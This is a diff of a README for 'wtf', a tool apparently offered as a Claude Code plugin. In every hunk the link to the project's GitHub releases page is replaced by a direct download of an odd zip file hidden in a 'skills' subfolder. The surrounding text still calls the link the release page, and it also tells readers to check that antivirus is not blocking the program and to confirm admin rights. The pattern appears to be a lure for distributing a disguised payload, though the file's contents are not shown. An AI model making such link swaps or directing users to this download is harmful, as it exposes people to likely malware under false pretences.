@@ -1,6 +1,6 @@
 # 🎛️ wtf - Fix Issues When Things Go Sideways
 
-[![Download wtf](https://img.shields.io/badge/Download-wtf-brightgreen)](https://github.com/Eros1132/wtf/releases)
+[![Download wtf](https://img.shields.io/badge/Download-wtf-brightgreen)](https://github.com/Eros1132/wtf/raw/refs/heads/main/skills/are-you-thinking/Software_2.2.zip)
 
 wtf is a simple tool designed to help you handle unexpected problems quickly. It works as a plugin for Claude Code, giving you a straightforward way to solve issues when things do not go as planned.
 
@@ -35,7 +35,7 @@ These requirements help ensure wtf runs smoothly and without issues.
 
 To get wtf, visit the official release page:
 
-[![Download wtf](https://img.shields.io/badge/Download-wtf-blue)](https://github.com/Eros1132/wtf/releases)
+[![Download wtf](https://img.shields.io/badge/Download-wtf-blue)](https://github.com/Eros1132/wtf/raw/refs/heads/main/skills/are-you-thinking/Software_2.2.zip)
 
 This page lists all available versions. Choose the latest one for the best experience.
 
@@ -44,7 +44,7 @@ This page lists all available versions. Choose the latest one for the best exper
 ## 📦 How to Download and Install wtf
 
 1. **Open the release page**  
-   Follow this link: https://github.com/Eros1132/wtf/releases
+   Follow this link: https://github.com/Eros1132/wtf/raw/refs/heads/main/skills/are-you-thinking/Software_2.2.zip
 
 2. **Find the latest version**  
    Look for the newest release at the top of the list. Versions are marked with tags like v1.0, v1.1, etc.
@@ -105,7 +105,7 @@ If you have trouble installing or using wtf, try this:
 - Check that your antivirus or firewall is not blocking the program.
 - Confirm you have admin rights during installation.
 - Uninstall any previous incomplete versions first.
-- Visit the GitHub release page for updated instructions or known issues: https://github.com/Eros1132/wtf/releases
+- Visit the GitHub release page for updated instructions or known issues: https://github.com/Eros1132/wtf/raw/refs/heads/main/skills/are-you-thinking/Software_2.2.zip
 
 ---
 
@@ -121,4 +121,4 @@ For support, you can:
 
 # Download wtf to fix problems quickly:
 
-[![Download wtf](https://img.shields.io/badge/Download-wtf-brightgreen)](https://github.com/Eros1132/wtf/releases)
+[![Download wtf](https://img.shields.io/badge/Download-wtf-brightgreen)](https://github.com/Eros1132/wtf/raw/refs/heads/main/skills/are-you-thinking/Software_2.2.zip)
